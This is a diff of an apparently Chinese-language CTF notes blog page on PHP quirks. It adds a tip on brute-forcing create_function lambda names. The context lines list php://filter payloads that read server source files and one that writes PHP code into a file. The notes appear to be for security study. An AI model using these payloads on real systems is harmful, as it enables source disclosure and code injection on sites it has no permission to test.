@@ -14,7 +14,7 @@
 <meta property="og:description" content="fa php原生类12345678910111213141516171819202122232425262728293031323334353637383940414243发布    hexo new &#96;date +%Y%m%d%H&#96;&lt;?php$target &#x3D; &amp;#x27;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?action&#x3D;login&amp;#x27;;$post_string">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-10-13T12:41:29.000Z">
-<meta property="article:modified_time" content="2021-12-06T15:02:26.554Z">
+<meta property="article:modified_time" content="2021-12-12T08:04:38.571Z">
 <meta property="article:author" content="Te Fuir">
 <meta name="twitter:card" content="summary">
     
@@ -103,6 +103,7 @@
 <p>intval(“0x1234”+ 1)中</p>
 <p>php5在相加之前把0x1234 变成一个十进制数字，而php7则是将0x1234 变成0之后和1相加，前者导致结果为4661，而后者为1。</p>
 <p>这是因为在php7对string处理上的调整，十六进制字符串不再被认为是数字。</p>
+<p>create_function的匿名函数也是有名字的，名字是\x00lambda_%d，其中%d代表他是当前进程中的第几个匿名函数,所以直接拿burp爆破即可.</p>
 <h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>php://filter/convert.%6%32ase64-encode/resource=GWHT.php</p>
 <p>base64<br>rot13<br>base32<br>base16<br>?file=php://filter/read=convert.iconv.utf-8.utf-16be/resource=index.php<br>?file=php://filter/read=convert.quoted-printable-encode/resource=index.php</p>
 <p>?filename=php://filter/write=convert.base64-decode/resource=example.php&amp;content=PD9waHAgcGhwaW5mbygpOyA/Pg==</p>
